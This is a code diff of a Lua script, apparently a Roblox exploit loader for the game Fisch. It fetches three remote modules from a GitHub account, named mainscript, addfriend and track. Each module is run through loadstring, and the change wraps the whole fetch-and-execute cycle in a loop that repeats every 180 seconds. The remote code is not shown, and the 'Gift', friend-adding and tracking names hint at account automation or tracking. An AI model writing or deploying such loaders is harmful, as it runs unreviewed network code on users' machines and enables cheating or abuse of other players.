@@ -2,38 +2,55 @@
 if not game:IsLoaded() then
     repeat game.Loaded:Wait() until game:IsLoaded()
 end
-local type = "Gift"
-local TeleportService = game:GetService("TeleportService")
-local PlaceId         = game.PlaceId
-local JobId           = game.JobId
-local player      = game:GetService("Players").LocalPlayer
 
-local urls= {
-    "https://raw.githubusercontent.com/Duyy-2006/Work-File-Revamped/refs/heads/main/FIsch/mainscript.lua",
-    "https://raw.githubusercontent.com/Duyy-2006/Work-File-Revamped/refs/heads/main/FIsch/addfriend.lua",
-    "https://raw.githubusercontent.com/Duyy-2006/Work-File-Revamped/refs/heads/main/FIsch/track.lua",
-}
-for _, url in ipairs(urls) do
-    local ok, chunkOrErr = pcall(game.HttpGet, game, url)
-    if not ok then
-        --player:Kick("Error")
-        return
-    end
+local INTERVAL_SECONDS = 180
 
-    local fn, loadErr = loadstring(chunkOrErr)
-    if not fn then
-        --player:Kick("Error")
-        return
-    end
+local function runOnce()
+    local giftType = "Gift" -- renamed from `type` to avoid shadowing Lua's type()
 
-    -- Run each module in its own thread so a blocking loop inside one
-    -- won't stop the others from loading.
-    task.spawn(function()
-        local success, runErr = pcall(fn)
-        if not success then
-            --player:Kick("Error")
+    local TeleportService = game:GetService("TeleportService")
+    local PlaceId         = game.PlaceId
+    local JobId           = game.JobId
+    local player          = game:GetService("Players").LocalPlayer
+
+    local urls= {
+        "https://raw.githubusercontent.com/Duyy-2006/Work-File-Revamped/refs/heads/main/FIsch/mainscript.lua",
+        "https://raw.githubusercontent.com/Duyy-2006/Work-File-Revamped/refs/heads/main/FIsch/addfriend.lua",
+        "https://raw.githubusercontent.com/Duyy-2006/Work-File-Revamped/refs/heads/main/FIsch/track.lua",
+    }
+
+    for _, url in ipairs(urls) do
+        local ok, chunkOrErr = pcall(game.HttpGet, game, url)
+        if not ok then
+            -- player:Kick("Error")
+            return
         end
-    end)
+
+        local fn, loadErr = loadstring(chunkOrErr)
+        if not fn then
+            -- player:Kick("Error")
+            return
+        end
+
+        -- Run each module in its own thread so a blocking loop inside one
+        -- won't stop the others from loading.
+        task.spawn(function()
+            local success, runErr = pcall(fn)
+            if not success then
+                -- player:Kick("Error")
+            end
+        end)
+    end
 end
 
+-- First run immediately
+runOnce()
 
+-- Repeat every 180 seconds
+while true do
+    task.wait(INTERVAL_SECONDS)
+    if not game:IsLoaded() then
+        repeat game.Loaded:Wait() until game:IsLoaded()
+    end
+    runOnce()
+end
